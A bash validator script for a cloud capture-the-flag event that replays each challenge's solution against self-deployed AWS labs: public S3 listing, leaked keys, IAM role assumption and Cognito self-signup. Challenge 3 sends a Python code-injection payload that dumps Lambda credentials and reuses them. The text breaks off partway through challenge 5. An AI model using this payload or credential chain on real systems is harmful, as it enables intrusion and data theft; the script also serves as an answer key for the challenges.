#!/usr/bin/env bash
set -euo pipefail

# ==============================================================================
# HiveCTF Challenge Validator
#
# Walks through each challenge's solution (from the walkthroughs) and validates
# that every step works correctly and the flag is retrievable.
#
# Usage:
#   ./scripts/validate-challenges.sh          # validate all challenges
#   ./scripts/validate-challenges.sh 1        # validate challenge 1 only
#   ./scripts/validate-challenges.sh 1 3 5    # validate specific challenges
#
# Prerequisites:
#   - All challenges deployed via deploy-all.sh
#   - AWS CLI v2 installed
#   - jq installed
#   - curl installed
#   - base64 command available
#   - Terraform state accessible for each challenge
# ==============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAFORM_DIR="${SCRIPT_DIR}/../terraform"
REGION="us-east-1"

# =============================================================================
# USER CONFIGURATION - Update these values for your deployment
# =============================================================================
# Account IDs for your two AWS accounts
ACCOUNT_1_ID="${HIVECTF_ACCOUNT_1_ID:?Set HIVECTF_ACCOUNT_1_ID env var}"
ACCOUNT_2_ID="${HIVECTF_ACCOUNT_2_ID:?Set HIVECTF_ACCOUNT_2_ID env var}"
# AWS CLI profile with admin access to Account 2 (used for Cognito cleanup)
ACCOUNT_2_ADMIN_PROFILE="${HIVECTF_ACCOUNT_2_PROFILE:?Set HIVECTF_ACCOUNT_2_PROFILE env var}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

PASS_COUNT=0
FAIL_COUNT=0
WARN_COUNT=0

pass() {
    PASS_COUNT=$((PASS_COUNT + 1))
    echo -e "  ${GREEN}[PASS]${NC} $1"
}

fail() {
    FAIL_COUNT=$((FAIL_COUNT + 1))
    echo -e "  ${RED}[FAIL]${NC} $1"
}

warn() {
    WARN_COUNT=$((WARN_COUNT + 1))
    echo -e "  ${YELLOW}[WARN]${NC} $1"
}

info() {
    echo -e "  ${CYAN}[INFO]${NC} $1"
}

step() {
    echo -e "\n  ${BLUE}--- Step $1: $2 ---${NC}"
}

tf_output() {
    local dir="$1"
    local key="$2"
    terraform -chdir="$dir" output -raw "$key" 2>/dev/null
}

# Clear any env vars that might interfere
clear_aws_env() {
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_DEFAULT_REGION 2>/dev/null || true
}

# ==============================================================================
# Challenge 1: Bucket List
# ==============================================================================
validate_challenge_1() {
    echo -e "\n${CYAN}========================================${NC}"
    echo -e "${CYAN}  Challenge 1: Bucket List (Easy)${NC}"
    echo -e "${CYAN}========================================${NC}"

    local TF_DIR="${TERRAFORM_DIR}/challenge-1-bucket-list"
    local EXPECTED_FLAG
    EXPECTED_FLAG=$(tf_output "$TF_DIR" "challenge_flag")

    clear_aws_env

    # Get terraform outputs
    local BUCKET_NAME WEBSITE_URL ACCESS_KEY SECRET_KEY
    BUCKET_NAME=$(tf_output "$TF_DIR" "bucket_name")
    WEBSITE_URL=$(tf_output "$TF_DIR" "website_url")
    ACCESS_KEY=$(tf_output "$TF_DIR" "reader_access_key_id")
    SECRET_KEY=$(tf_output "$TF_DIR" "reader_secret_access_key")

    if [ -z "$BUCKET_NAME" ]; then
        fail "Could not read terraform outputs. Is challenge 1 deployed?"
        return 1
    fi

    step 1 "Visit the website"
    local HTML
    HTML=$(curl -sf "http://${WEBSITE_URL}" 2>/dev/null || true)
    if [ -n "$HTML" ] && echo "$HTML" | grep -q "CloudNine"; then
        pass "Website is accessible and contains CloudNine branding"
    else
        fail "Website not accessible at http://${WEBSITE_URL}"
    fi

    step 2 "Find HTML comments pointing to backups"
    if echo "$HTML" | grep -q "/backups/"; then
        pass "HTML source contains /backups/ directory hint"
    else
        fail "HTML source missing /backups/ comment"
    fi
    if echo "$HTML" | grep -q "employee-portal-config.bak"; then
        pass "HTML source references employee-portal-config.bak"
    else
        fail "HTML source missing .bak file reference"
    fi

    step 3 "List S3 bucket (no credentials)"
    local BUCKET_LIST
    BUCKET_LIST=$(aws s3 ls "s3://${BUCKET_NAME}/" --no-sign-request --region "$REGION" 2>&1 || true)
    if echo "$BUCKET_LIST" | grep -q "backups/"; then
        pass "Public bucket listing shows backups/ directory"
    else
        fail "Cannot list bucket publicly: $BUCKET_LIST"
    fi

    local BACKUP_LIST
    BACKUP_LIST=$(aws s3 ls "s3://${BUCKET_NAME}/backups/" --no-sign-request --region "$REGION" 2>&1 || true)
    if echo "$BACKUP_LIST" | grep -q "employee-portal-config.bak"; then
        pass "Backups directory contains employee-portal-config.bak"
    else
        fail "Cannot find .bak file in backups/"
    fi

    step 4 "Download and extract credentials from .bak file"
    local BAK_CONTENT
    BAK_CONTENT=$(aws s3 cp "s3://${BUCKET_NAME}/backups/employee-portal-config.bak" - --no-sign-request --region "$REGION" 2>/dev/null || true)
    if echo "$BAK_CONTENT" | grep -q "aws_access_key_id"; then
        pass ".bak file contains AWS credentials"
    else
        fail ".bak file missing credentials"
    fi

    local BAK_ACCESS_KEY BAK_SECRET_KEY
    BAK_ACCESS_KEY=$(echo "$BAK_CONTENT" | grep "aws_access_key_id" | awk -F'=' '{print $2}' | tr -d ' ')
    BAK_SECRET_KEY=$(echo "$BAK_CONTENT" | grep "aws_secret_access_key" | awk -F'=' '{print $2}' | tr -d ' ')

    if [ "$BAK_ACCESS_KEY" = "$ACCESS_KEY" ]; then
        pass "Access key in .bak matches terraform output"
    else
        fail "Access key mismatch: .bak='${BAK_ACCESS_KEY}' tf='${ACCESS_KEY}'"
    fi

    step 5 "Verify credentials via STS"
    export AWS_ACCESS_KEY_ID="$BAK_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$BAK_SECRET_KEY"
    export AWS_DEFAULT_REGION="$REGION"

    local IDENTITY
    IDENTITY=$(aws sts get-caller-identity 2>&1 || true)
    if echo "$IDENTITY" | jq -r '.Arn' 2>/dev/null | grep -q "hivectf-ch1-reader"; then
        pass "Credentials authenticate as hivectf-ch1-reader"
    else
        fail "STS identity check failed: $IDENTITY"
    fi

    step 6 "List secrets"
    local SECRETS
    SECRETS=$(aws secretsmanager list-secrets --region "$REGION" 2>&1 || true)
    if echo "$SECRETS" | grep -q "hivectf/challenge1/flag"; then
        pass "Can list secrets and find hivectf/challenge1/flag"
    else
        fail "Cannot list secrets or find flag secret: $SECRETS"
    fi

    step 7 "Retrieve the flag"
    local FLAG
    FLAG=$(aws secretsmanager get-secret-value \
        --secret-id "hivectf/challenge1/flag" \
        --query SecretString \
        --output text \
        --region "$REGION" 2>/dev/null | jq -r .flag 2>/dev/null || true)

    if [ "$FLAG" = "$EXPECTED_FLAG" ]; then
        pass "Flag retrieved: ${FLAG}"
    else
        fail "Expected flag '${EXPECTED_FLAG}' but got '${FLAG}'"
    fi

    clear_aws_env
}

# ==============================================================================
# Challenge 2: Role Call
# ==============================================================================
validate_challenge_2() {
    echo -e "\n${CYAN}========================================${NC}"
    echo -e "${CYAN}  Challenge 2: Role Call (Easy-Medium)${NC}"
    echo -e "${CYAN}========================================${NC}"

    local TF_DIR="${TERRAFORM_DIR}/challenge-2-role-call"
    local EXPECTED_FLAG
    EXPECTED_FLAG=$(tf_output "$TF_DIR" "challenge_flag")
    local ACCOUNT_ID="$ACCOUNT_1_ID"

    clear_aws_env

    local ACCESS_KEY SECRET_KEY
    ACCESS_KEY=$(tf_output "$TF_DIR" "intern_access_key_id")
    SECRET_KEY=$(tf_output "$TF_DIR" "intern_secret_access_key")

    if [ -z "$ACCESS_KEY" ]; then
        fail "Could not read terraform outputs. Is challenge 2 deployed?"
        return 1
    fi

    export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
    export AWS_DEFAULT_REGION="$REGION"

    step 1 "Verify identity as intern"
    local IDENTITY
    IDENTITY=$(aws sts get-caller-identity 2>&1 || true)
    if echo "$IDENTITY" | jq -r '.Arn' 2>/dev/null | grep -q "hivectf-ch2-intern"; then
        pass "Authenticated as hivectf-ch2-intern"
    else
        fail "Identity check failed: $IDENTITY"
    fi

    step "1.5" "Discover own permissions"
    local POLICIES
    POLICIES=$(aws iam list-user-policies --user-name hivectf-ch2-intern 2>&1 || true)
    if echo "$POLICIES" | grep -q "hivectf-ch2-intern-policy"; then
        pass "Can list own user policies"
    else
        fail "Cannot list user policies: $POLICIES"
    fi

    local POLICY_DOC
    POLICY_DOC=$(aws iam get-user-policy --user-name hivectf-ch2-intern --policy-name hivectf-ch2-intern-policy 2>&1 || true)
    if echo "$POLICY_DOC" | grep -q "sts:AssumeRole"; then
        pass "Policy document reveals sts:AssumeRole permission"
    else
        fail "Cannot read user policy: $POLICY_DOC"
    fi

    step 2 "Enumerate IAM roles"
    local ROLES
    ROLES=$(aws iam list-roles --query "Roles[?starts_with(RoleName, 'hivectf-ch2')].[RoleName]" --output text 2>&1 || true)
    if echo "$ROLES" | grep -q "hivectf-ch2-dev-role"; then
        pass "Found hivectf-ch2-dev-role in role listing"
    else
        fail "Could not find dev role: $ROLES"
    fi

    step 3 "Inspect dev role trust policy"
    local ROLE_INFO
    ROLE_INFO=$(aws iam get-role --role-name hivectf-ch2-dev-role 2>&1 || true)
    if echo "$ROLE_INFO" | grep -q "hivectf-ch2-intern"; then
        pass "Dev role trust policy allows hivectf-ch2-intern"
    else
        fail "Dev role trust policy doesn't reference intern: $ROLE_INFO"
    fi

    step 4 "Assume the dev role"
    local ASSUME_RESULT
    ASSUME_RESULT=$(aws sts assume-role \
        --role-arn "arn:aws:iam::${ACCOUNT_ID}:role/hivectf-ch2-dev-role" \
        --role-session-name "validate-session" 2>&1 || true)

    local DEV_ACCESS DEV_SECRET DEV_TOKEN
    DEV_ACCESS=$(echo "$ASSUME_RESULT" | jq -r '.Credentials.AccessKeyId' 2>/dev/null || true)
    DEV_SECRET=$(echo "$ASSUME_RESULT" | jq -r '.Credentials.SecretAccessKey' 2>/dev/null || true)
    DEV_TOKEN=$(echo "$ASSUME_RESULT" | jq -r '.Credentials.SessionToken' 2>/dev/null || true)

    if [ -n "$DEV_ACCESS" ] && [ "$DEV_ACCESS" != "null" ]; then
        pass "Successfully assumed dev role"
    else
        fail "Could not assume dev role: $ASSUME_RESULT"
        clear_aws_env
        return 1
    fi

    export AWS_ACCESS_KEY_ID="$DEV_ACCESS"
    export AWS_SECRET_ACCESS_KEY="$DEV_SECRET"
    export AWS_SESSION_TOKEN="$DEV_TOKEN"

    step 5 "Verify new identity as dev role"
    IDENTITY=$(aws sts get-caller-identity 2>&1 || true)
    if echo "$IDENTITY" | jq -r '.Arn' 2>/dev/null | grep -q "hivectf-ch2-dev-role"; then
        pass "Operating as hivectf-ch2-dev-role"
    else
        fail "Identity mismatch: $IDENTITY"
    fi

    step "5.5" "Discover dev role permissions"
    local DEV_POLICIES
    DEV_POLICIES=$(aws iam list-role-policies --role-name hivectf-ch2-dev-role 2>&1 || true)
    if echo "$DEV_POLICIES" | grep -q "hivectf-ch2-dev-lambda-policy"; then
        pass "Can list dev role policies"
    else
        fail "Cannot list dev role policies: $DEV_POLICIES"
    fi

    local DEV_POLICY_DOC
    DEV_POLICY_DOC=$(aws iam get-role-policy --role-name hivectf-ch2-dev-role --policy-name hivectf-ch2-dev-lambda-policy 2>&1 || true)
    if echo "$DEV_POLICY_DOC" | grep -q "lambda:ListFunctions"; then
        pass "Dev role policy reveals Lambda permissions"
    else
        fail "Cannot read dev role policy: $DEV_POLICY_DOC"
    fi

    step 6 "List Lambda functions"
    local FUNCTIONS
    FUNCTIONS=$(aws lambda list-functions \
        --query "Functions[?starts_with(FunctionName, 'hivectf-ch2')].[FunctionName]" \
        --output text --region "$REGION" 2>&1 || true)
    if echo "$FUNCTIONS" | grep -q "hivectf-ch2-internal-processor"; then
        pass "Found hivectf-ch2-internal-processor"
    else
        fail "Cannot find internal processor function: $FUNCTIONS"
    fi
    if echo "$FUNCTIONS" | grep -q "hivectf-ch2-public-api"; then
        pass "Found decoy function hivectf-ch2-public-api"
    else
        warn "Decoy function hivectf-ch2-public-api not found"
    fi

    step 7 "Extract flag from Lambda env vars"
    local DECOY_CONFIG
    DECOY_CONFIG=$(aws lambda get-function-configuration \
        --function-name hivectf-ch2-public-api \
        --region "$REGION" 2>&1 || true)
    if echo "$DECOY_CONFIG" | jq -r '.Environment.Variables.FLAG' 2>/dev/null | grep -q "null\|^$"; then
        pass "Decoy function has no FLAG env var (correct)"
    else
        warn "Decoy function unexpectedly contains FLAG env var"
    fi

    local PROC_CONFIG FLAG
    PROC_CONFIG=$(aws lambda get-function-configuration \
        --function-name hivectf-ch2-internal-processor \
        --region "$REGION" 2>&1 || true)
    FLAG=$(echo "$PROC_CONFIG" | jq -r '.Environment.Variables.FLAG' 2>/dev/null || true)

    if [ "$FLAG" = "$EXPECTED_FLAG" ]; then
        pass "Flag retrieved: ${FLAG}"
    else
        fail "Expected flag '${EXPECTED_FLAG}' but got '${FLAG}'"
    fi

    clear_aws_env
}

# ==============================================================================
# Challenge 3: Bee's Knees
# ==============================================================================
validate_challenge_3() {
    echo -e "\n${CYAN}========================================${NC}"
    echo -e "${CYAN}  Challenge 3: Bee's Knees (Medium)${NC}"
    echo -e "${CYAN}========================================${NC}"

    local TF_DIR="${TERRAFORM_DIR}/challenge-3-bees-knees"
    local EXPECTED_FLAG
    EXPECTED_FLAG=$(tf_output "$TF_DIR" "challenge_flag")

    clear_aws_env

    local API_BASE_URL BUCKET_NAME
    API_BASE_URL=$(tf_output "$TF_DIR" "api_base_url")
    BUCKET_NAME=$(tf_output "$TF_DIR" "bucket_name")

    if [ -z "$API_BASE_URL" ]; then
        fail "Could not read terraform outputs. Is challenge 3 deployed?"
        return 1
    fi

    step 1 "Verify decoy and real endpoints exist"
    # Non-existent path should return 403
    local MISSING_STATUS
    MISSING_STATUS=$(curl -s -o /dev/null -w '%{http_code}' "${API_BASE_URL}/nonexistent" 2>/dev/null || true)
    if [ "$MISSING_STATUS" = "403" ]; then
        pass "Non-existent path returns 403 (fuzzable)"
    else
        warn "Non-existent path returned ${MISSING_STATUS} instead of 403"
    fi

    # Decoy endpoints should return 200
    local HEALTH_RESP
    HEALTH_RESP=$(curl -s "${API_BASE_URL}/health" 2>/dev/null || true)
    if echo "$HEALTH_RESP" | jq -r '.status' 2>/dev/null | grep -q "ok"; then
        pass "Decoy /health endpoint returns 200"
    else
        fail "Decoy /health not working: $HEALTH_RESP"
    fi

    local STATUS_RESP
    STATUS_RESP=$(curl -s "${API_BASE_URL}/status" 2>/dev/null || true)
    if echo "$STATUS_RESP" | jq -r '.sensors_online' 2>/dev/null | grep -q "3"; then
        pass "Decoy /status endpoint returns 200"
    else
        fail "Decoy /status not working: $STATUS_RESP"
    fi

    local INFO_RESP
    INFO_RESP=$(curl -s "${API_BASE_URL}/info" 2>/dev/null || true)
    if echo "$INFO_RESP" | jq -r '.api_name' 2>/dev/null | grep -q "HiveWatch"; then
        pass "Decoy /info endpoint returns 200"
    else
        fail "Decoy /info not working: $INFO_RESP"
    fi

    # Real sensor endpoint
    local NORMAL_RESP
    NORMAL_RESP=$(curl -sf "${API_BASE_URL}/sensor?id=HV-001" 2>/dev/null || true)
    if echo "$NORMAL_RESP" | jq -r '.sensor_id' 2>/dev/null | grep -q "HV-001"; then
        pass "Real /sensor endpoint returns HV-001 data"
    else
        fail "Sensor query failed: $NORMAL_RESP"
    fi

    local INVALID_RESP
    INVALID_RESP=$(curl -s "${API_BASE_URL}/sensor?id=INVALID" 2>/dev/null || true)
    if echo "$INVALID_RESP" | jq -r '.error' 2>/dev/null | grep -q "not found"; then
        pass "Invalid sensor ID returns error with available list"
    else
        fail "Invalid query response unexpected: $INVALID_RESP"
    fi

    step 2 "Discover injection point with single quote"
    local INJECT_TEST
    INJECT_TEST=$(curl -s "${API_BASE_URL}/sensor?id='" 2>/dev/null || true)
    if echo "$INJECT_TEST" | grep -q "SyntaxError"; then
        pass "Single quote triggers SyntaxError (code injection confirmed)"
    else
        fail "Injection test didn't reveal vulnerability: $INJECT_TEST"
    fi
    if echo "$INJECT_TEST" | grep -q "SENSOR_DATA.get"; then
        pass "Error detail shows the dynamic expression pattern"
    else
        warn "Error detail missing expression context"
    fi

    step 3 "Extract Lambda environment variables via injection"
    local INJECTION_PAYLOAD="')+or+__import__('os').popen('env').read()+or+('"
    local INJECT_RESP
    INJECT_RESP=$(curl -s "${API_BASE_URL}/sensor?id=${INJECTION_PAYLOAD}" 2>/dev/null || true)

    local ENV_DATA
    ENV_DATA=$(echo "$INJECT_RESP" | jq -r '.data' 2>/dev/null || true)

    if echo "$ENV_DATA" | grep -q "AWS_ACCESS_KEY_ID"; then
        pass "Injection extracted AWS_ACCESS_KEY_ID"
    else
        fail "Injection did not return AWS creds: $(echo "$INJECT_RESP" | head -c 200)"
    fi
    if echo "$ENV_DATA" | grep -q "AWS_SESSION_TOKEN"; then
        pass "Injection extracted AWS_SESSION_TOKEN"
    else
        fail "Injection did not return session token"
    fi
    if echo "$ENV_DATA" | grep -q "BUCKET_NAME"; then
        pass "Injection extracted BUCKET_NAME"
    else
        fail "Injection did not return BUCKET_NAME"
    fi

    step 4 "Use stolen credentials"
    local STOLEN_ACCESS STOLEN_SECRET STOLEN_TOKEN STOLEN_BUCKET
    STOLEN_ACCESS=$(echo "$ENV_DATA" | sed -n 's/.*AWS_ACCESS_KEY_ID=\([A-Za-z0-9/+=]*\).*/\1/p' | head -1 || true)
    STOLEN_SECRET=$(echo "$ENV_DATA" | sed -n 's/.*AWS_SECRET_ACCESS_KEY=\([A-Za-z0-9/+=]*\).*/\1/p' | head -1 || true)
    STOLEN_TOKEN=$(echo "$ENV_DATA" | sed -n 's/.*AWS_SESSION_TOKEN=\([A-Za-z0-9/+=]*\).*/\1/p' | head -1 || true)
    STOLEN_BUCKET=$(echo "$ENV_DATA" | sed -n 's/.*BUCKET_NAME=\([A-Za-z0-9._-]*\).*/\1/p' | head -1 || true)

    if [ -z "$STOLEN_ACCESS" ]; then
        fail "Could not parse stolen credentials from env output"
        return 1
    fi

    export AWS_ACCESS_KEY_ID="$STOLEN_ACCESS"
    export AWS_SECRET_ACCESS_KEY="$STOLEN_SECRET"
    export AWS_SESSION_TOKEN="$STOLEN_TOKEN"
    export AWS_DEFAULT_REGION="$REGION"

    local IDENTITY
    IDENTITY=$(aws sts get-caller-identity 2>&1 || true)
    if echo "$IDENTITY" | jq -r '.Arn' 2>/dev/null | grep -q "hivectf-ch3"; then
        pass "Stolen credentials authenticate as Lambda role"
    else
        fail "Stolen creds identity check failed: $IDENTITY"
    fi

    step 5 "List S3 bucket and retrieve flag"
    local TARGET_BUCKET="${STOLEN_BUCKET:-$BUCKET_NAME}"
    local S3_LIST
    S3_LIST=$(aws s3 ls "s3://${TARGET_BUCKET}/" --recursive --region "$REGION" 2>&1 || true)
    if echo "$S3_LIST" | grep -q "classified/flag.txt"; then
        pass "S3 bucket contains classified/flag.txt"
    else
        fail "Cannot find flag.txt in bucket: $S3_LIST"
    fi

    local FLAG
    FLAG=$(aws s3 cp "s3://${TARGET_BUCKET}/classified/flag.txt" - --region "$REGION" 2>/dev/null || true)
    FLAG=$(echo "$FLAG" | tr -d '[:space:]')
    if [ "$FLAG" = "$EXPECTED_FLAG" ]; then
        pass "Flag retrieved: ${FLAG}"
    else
        fail "Expected flag '${EXPECTED_FLAG}' but got '${FLAG}'"
    fi

    clear_aws_env
}

# ==============================================================================
# Challenge 4: Hive Mind
# ==============================================================================
validate_challenge_4() {
    echo -e "\n${CYAN}========================================${NC}"
    echo -e "${CYAN}  Challenge 4: Hive Mind (Medium-Hard)${NC}"
    echo -e "${CYAN}========================================${NC}"

    local TF_DIR="${TERRAFORM_DIR}/challenge-4-hive-mind"
    local EXPECTED_FLAG
    EXPECTED_FLAG=$(tf_output "$TF_DIR" "challenge_flag")

    clear_aws_env

    local WEBSITE_URL POOL_ID CLIENT_ID IDENTITY_POOL_ID
    WEBSITE_URL=$(tf_output "$TF_DIR" "website_url")
    POOL_ID=$(tf_output "$TF_DIR" "cognito_user_pool_id")
    CLIENT_ID=$(tf_output "$TF_DIR" "cognito_client_id")
    IDENTITY_POOL_ID=$(tf_output "$TF_DIR" "cognito_identity_pool_id")

    if [ -z "$CLIENT_ID" ]; then
        fail "Could not read terraform outputs. Is challenge 4 deployed?"
        return 1
    fi

    step 1 "Inspect website source for Cognito config"
    local HTML
    HTML=$(curl -sf "$WEBSITE_URL" 2>/dev/null || true)
    if echo "$HTML" | grep -q "COGNITO_USER_POOL_ID"; then
        pass "Website source exposes COGNITO_USER_POOL_ID"
    else
        fail "Website source missing Cognito config"
    fi
    if echo "$HTML" | grep -q "COGNITO_CLIENT_ID"; then
        pass "Website source exposes COGNITO_CLIENT_ID"
    else
        fail "Website source missing COGNITO_CLIENT_ID"
    fi
    if echo "$HTML" | grep -q "COGNITO_IDENTITY_POOL_ID"; then
        pass "Website source exposes COGNITO_IDENTITY_POOL_ID"
    else
        fail "Website source missing COGNITO_IDENTITY_POOL_ID"
    fi

    step 2 "Sign up for a Cognito account"
    local SIGNUP_EMAIL="validator-$(date +%s)@hivectf.test"
    local SIGNUP_PASS='V@lid8te!CTF2026'
    local SIGNUP_RESULT
    SIGNUP_RESULT=$(aws cognito-idp sign-up \
        --client-id "$CLIENT_ID" \
        --username "$SIGNUP_EMAIL" \
        --password "$SIGNUP_PASS" \
        --no-sign-request \
        --region "$REGION" 2>&1 || true)

    if echo "$SIGNUP_RESULT" | jq -r '.UserConfirmed' 2>/dev/null | grep -qi "true"; then
        pass "Sign-up succeeded with auto-confirmation"
    else
        fail "Sign-up failed: $SIGNUP_RESULT"
        return 1
    fi

    step 3 "Authenticate and get tokens"
    local AUTH_RESULT
    AUTH_RESULT=$(aws cognito-idp initiate-auth \
        --client-id "$CLIENT_ID" \
        --auth-flow USER_PASSWORD_AUTH \
        --auth-parameters "USERNAME=${SIGNUP_EMAIL},PASSWORD=${SIGNUP_PASS}" \
        --no-sign-request \
        --region "$REGION" 2>&1 || true)

    local ID_TOKEN
    ID_TOKEN=$(echo "$AUTH_RESULT" | jq -r '.AuthenticationResult.IdToken' 2>/dev/null || true)

    if [ -n "$ID_TOKEN" ] && [ "$ID_TOKEN" != "null" ]; then
        pass "Authentication succeeded, got IdToken"
    else
        fail "Authentication failed: $AUTH_RESULT"
        return 1
    fi

    step 4 "Get Identity ID from Identity Pool"
    local IDP_PROVIDER="cognito-idp.${REGION}.amazonaws.com/${POOL_ID}"
    local IDENTITY_RESULT
    IDENTITY_RESULT=$(aws cognito-identity get-id \
        --identity-pool-id "$IDENTITY_POOL_ID" \
        --logins "${IDP_PROVIDER}=${ID_TOKEN}" \
        --no-sign-request \
        --region "$REGION" 2>&1 || true)

    local IDENTITY_ID
    IDENTITY_ID=$(echo "$IDENTITY_RESULT" | jq -r '.IdentityId' 2>/dev/null || true)

    if [ -n "$IDENTITY_ID" ] && [ "$IDENTITY_ID" != "null" ]; then
        pass "Got Identity ID: ${IDENTITY_ID}"
    else
        fail "Failed to get identity ID: $IDENTITY_RESULT"
        return 1
    fi

    step 5 "Exchange for AWS credentials"
    local CREDS_RESULT
    CREDS_RESULT=$(aws cognito-identity get-credentials-for-identity \
        --identity-id "$IDENTITY_ID" \
        --logins "${IDP_PROVIDER}=${ID_TOKEN}" \
        --no-sign-request \
        --region "$REGION" 2>&1 || true)

    local COG_ACCESS COG_SECRET COG_TOKEN
    COG_ACCESS=$(echo "$CREDS_RESULT" | jq -r '.Credentials.AccessKeyId' 2>/dev/null || true)
    COG_SECRET=$(echo "$CREDS_RESULT" | jq -r '.Credentials.SecretKey' 2>/dev/null || true)
    COG_TOKEN=$(echo "$CREDS_RESULT" | jq -r '.Credentials.SessionToken' 2>/dev/null || true)

    if [ -n "$COG_ACCESS" ] && [ "$COG_ACCESS" != "null" ]; then
        pass "Got temporary AWS credentials"
    else
        fail "Failed to get AWS credentials: $CREDS_RESULT"
        return 1
    fi

    export AWS_ACCESS_KEY_ID="$COG_ACCESS"
    export AWS_SECRET_ACCESS_KEY="$COG_SECRET"
    export AWS_SESSION_TOKEN="$COG_TOKEN"
    export AWS_DEFAULT_REGION="$REGION"

    local STS_IDENTITY
    STS_IDENTITY=$(aws sts get-caller-identity 2>&1 || true)
    if echo "$STS_IDENTITY" | jq -r '.Arn' 2>/dev/null | grep -q "hivectf-ch4"; then
        pass "Credentials authenticate as Cognito authenticated role"
    else
        fail "STS identity check failed: $STS_IDENTITY"
    fi

    step "6.5" "Discover role permissions"
    local ROLE_POLICIES
    ROLE_POLICIES=$(aws iam list-role-policies --role-name hivectf-ch4-authenticated-role 2>&1 || true)
    if echo "$ROLE_POLICIES" | grep -q "hivectf-ch4-dynamodb-read"; then
        pass "Can list authenticated role policies"
    else
        fail "Cannot list role policies: $ROLE_POLICIES"
    fi

    local DDB_POLICY
    DDB_POLICY=$(aws iam get-role-policy \
        --role-name hivectf-ch4-authenticated-role \
        --policy-name hivectf-ch4-dynamodb-read 2>&1 || true)
    if echo "$DDB_POLICY" | grep -q "dynamodb"; then
        pass "DynamoDB policy readable - reveals table permissions"
    else
        fail "Cannot read DynamoDB policy: $DDB_POLICY"
    fi

    step 7 "Enumerate DynamoDB tables"
    local TABLES
    TABLES=$(aws dynamodb list-tables --region "$REGION" 2>&1 || true)
    local TABLE_COUNT=0
    for t in "hivectf-ch4-users" "hivectf-ch4-research-logs" "hivectf-ch4-admin-notes" "hivectf-ch4-vault"; do
        if echo "$TABLES" | grep -q "$t"; then
            TABLE_COUNT=$((TABLE_COUNT + 1))
        fi
    done
    if [ "$TABLE_COUNT" -eq 4 ]; then
        pass "All 4 DynamoDB tables found"
    else
        fail "Only found ${TABLE_COUNT}/4 expected tables"
    fi

    step 8 "Scan accessible tables and verify vault is restricted"
    # Scan users
    local USERS_SCAN
    USERS_SCAN=$(aws dynamodb scan --table-name hivectf-ch4-users --region "$REGION" 2>&1 || true)
    if echo "$USERS_SCAN" | jq -r '.Count' 2>/dev/null | grep -qE '^[0-9]+$'; then
        pass "Can scan hivectf-ch4-users table"
    else
        fail "Cannot scan users table: $(echo "$USERS_SCAN" | head -c 100)"
    fi

    # Scan research-logs
    local LOGS_SCAN
    LOGS_SCAN=$(aws dynamodb scan --table-name hivectf-ch4-research-logs --region "$REGION" 2>&1 || true)
    if echo "$LOGS_SCAN" | grep -q "LOG-2025"; then
        pass "Can scan research-logs table (contains LOG entries)"
    else
        fail "Cannot scan research-logs: $(echo "$LOGS_SCAN" | head -c 100)"
    fi

    # Scan admin-notes (should contain vault_key)
    local NOTES_SCAN
    NOTES_SCAN=$(aws dynamodb scan --table-name hivectf-ch4-admin-notes --region "$REGION" 2>&1 || true)
    if echo "$NOTES_SCAN" | grep -q "QUEEN-BEE-ALPHA"; then
        pass "Admin-notes contains vault key breadcrumb: QUEEN-BEE-ALPHA"
    else
        fail "Cannot find vault key in admin-notes: $(echo "$NOTES_SCAN" | head -c 200)"
    fi

    # Vault scan should FAIL
    local VAULT_SCAN
    VAULT_SCAN=$(aws dynamodb scan --table-name hivectf-ch4-vault --region "$REGION" 2>&1 || true)
    if echo "$VAULT_SCAN" | grep -q "AccessDeniedException"; then
        pass "Vault table scan correctly denied (GetItem-only)"
    else
        fail "Vault table scan should be denied but got: $(echo "$VAULT_SCAN" | head -c 200)"
    fi

    step 9 "Retrieve flag from vault via get-item"
    local VAULT_ITEM
    VAULT_ITEM=$(aws dynamodb get-item \
        --table-name hivectf-ch4-vault \
        --key '{"vault_key": {"S": "QUEEN-BEE-ALPHA"}}' \
        --region "$REGION" 2>&1 || true)

    local FLAG
    FLAG=$(echo "$VAULT_ITEM" | jq -r '.Item.flag.S' 2>/dev/null || true)

    if [ "$FLAG" = "$EXPECTED_FLAG" ]; then
        pass "Flag retrieved: ${FLAG}"
    else
        fail "Expected flag '${EXPECTED_FLAG}' but got '${FLAG}'"
    fi

    # Cleanup: delete the test Cognito user
    info "Cleaning up test Cognito user..."
    aws cognito-idp admin-delete-user \
        --user-pool-id "$POOL_ID" \
        --username "$SIGNUP_EMAIL" \
        --region "$REGION" \
        --profile "$ACCOUNT_2_ADMIN_PROFILE" 2>/dev/null || true

    clear_aws_env
}

# ==============================================================================
# Challenge 5: Queen's Gambit
# ==============================================================================
validate_challenge_5() {
    echo -e "\n${CYAN}========================================${NC}"
    echo -e "${CYAN}  Challenge 5: Queen's Gambit (Hard)${NC}"
    echo -e "${CYAN}========================================${NC}"

    local TF_DIR="${TERRAFORM_DIR}/challenge-5-queens-gambit"
    local EXPECTED_FLAG
    EXPECTED_FLAG=$(tf_output "$TF_DIR" "challenge_flag")
    local ACCOUNT1_ID="$ACCOUNT_1_ID"
    local ACCOUNT2_ID="$ACCOUNT_2_ID"

    clear_aws_env

    local SCOUT_ACCESS SCOUT_SECRET BUCKET_NAME
    SCOUT_ACCESS=$(tf_output "$TF_DIR" "scout_access_key_id")
    SCOUT_SECRET=$(tf_output "$TF_DIR" "scout_secret_access_key")
    BUCKET_NAME=$(tf_output "$TF_DIR" "bucket_name")

    if [ -z "$SCOUT_ACCESS" ]; then
        fail "Could not read terraform outputs. Is challenge 5 deployed?"
        return 1
    fi

    export AWS_ACCESS_KEY_ID="$SCOUT_ACCESS"
    export AWS_SECRET_ACCESS_KEY="$SCOUT_SECRET"
    export AWS_DEFAULT_REGION="$REGION"

    step 1 "Verify scout identity"
    local IDENTITY
    IDENTITY=$(aws sts get-caller-identity 2>&1 || true)
    if echo "$IDENTITY" | jq -r '.Arn' 2>/dev/null | grep -q "hivectf-ch5-scout"; then
        pass "Authenticated as hivectf-ch5-scout"
    else
        fail "Identity check failed: $IDENTITY"
    fi

    step 2 "Discover S3 bucket"
    local BUCKETS
